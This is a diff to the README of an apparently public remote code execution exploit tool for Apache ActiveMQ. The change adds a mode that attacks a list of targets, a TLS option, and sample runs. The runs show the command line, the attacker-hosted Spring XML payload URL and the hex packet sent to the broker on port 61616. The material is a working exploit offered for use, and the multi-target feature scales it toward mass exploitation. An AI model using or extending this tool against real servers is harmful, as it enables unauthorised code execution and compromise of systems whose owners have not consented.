@@ -88,7 +88,7 @@ Throwable Type Encoding
 
 ## Usage
 
-usage
+Usage
 
 ```bash
      _        _   _           __  __  ___        ____   ____ _____
@@ -97,16 +97,19 @@ usage
   / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
  /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|
 
-Usage of ./ActiveMQ-RCE:
+Usage of ./main:
   -i string
-    	ActiveMQ Server IP or Host
+        ActiveMQ Server IP or Host
+  -l string
+        List of ActiveMQ Servers IPs or Hosts and ports separeted by \n ex: 1.1.1.1:61616
   -p string
-    	ActiveMQ Server Port (default "61616")
+        ActiveMQ Server Port (default "61616")
+  -t    Use TLS for connection
   -u string
-    	Spring XML Url
+        Spring XML URL
 ```
 
-exploit
+Single target exploit
 
 ```bash
 $ ./ActiveMQ-RCE -i 127.0.0.1 -u http://127.0.0.1:8000/poc.xml
@@ -120,6 +123,26 @@ $ ./ActiveMQ-RCE -i 127.0.0.1 -u http://127.0.0.1:8000/poc.xml
 [*] XML URL: http://127.0.0.1:8000/poc.xml
 
 [*] Sending packet: 000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d687474703a2f2f3132372e302e302e313a383030302f706f632e786d6c
+```
+
+Multi-Target exploit:
+
+```Console
+$ ./ActiveMQ-RCE -l targets.txt -u http://127.0.0.1:8000/poc.xml
+     _        _   _           __  __  ___        ____   ____ _____
+    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
+   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
+  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
+ /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|
+
+[*] XML URL: http://127.0.0.1:8000/poc.xml
+[*] Targets list: target.txt
+
+[*] Sending packet: 000000631f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010010687474703a2f2f6c6f63616c686f7374
+[*] Target: localhost:61616
+[*] Target: 127.0.0.1:61616
+[*] Target: example.test:61616
+
 ```
 
 If you just want to simply detect whether there is a vulnerability, you can change the spring xml url to the dnslog address.
